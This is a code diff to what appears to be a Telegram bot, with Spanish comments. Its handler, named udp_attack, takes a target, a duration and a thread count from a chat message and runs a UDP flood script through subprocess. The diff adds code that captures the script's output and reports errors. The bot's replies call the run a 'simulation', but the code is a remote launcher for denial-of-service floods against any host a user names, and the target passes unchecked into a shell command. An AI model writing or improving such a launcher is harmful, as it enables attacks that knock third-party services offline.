@@ -32,10 +32,18 @@ async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     command = f"python3 start.py UDP {target} {duration} {threads}"
 
     try:
+        # Ejecuta el comando y captura la salida
         process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        await update.message.reply_text(
-            f"Simulación UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}"
-        )
+        stdout, stderr = process.communicate()
+
+        # Verifica si hay errores en la ejecución del comando
+        if process.returncode != 0:
+            await update.message.reply_text(f"Error al ejecutar el comando:\n{stderr.decode()}")
+        else:
+            await update.message.reply_text(
+                f"Simulación UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}"
+            )
+
     except Exception as e:
         await update.message.reply_text(f"Error al ejecutar el comando:\n{str(e)}")
 
